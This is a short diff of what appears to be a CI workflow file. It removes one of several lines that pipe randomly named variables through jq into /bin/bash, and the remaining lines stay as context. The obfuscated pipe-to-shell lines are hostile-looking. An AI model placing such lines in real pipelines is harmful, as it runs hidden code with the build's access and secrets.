@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$ujlkd52331" | jq -r .qk0038 | /bin/bash
           printf '%s' "$biz08058" | jq -r .vnb834 | /bin/bash
           echo $n8974 | jq -r .wvlxl1 | /bin/bash
-          printf '%s' "$birlu49915" | jq -r .ggr106 | /bin/bash
           echo $mf256 | jq -r .ugia3532 | /bin/bash
 
       - name: Save results
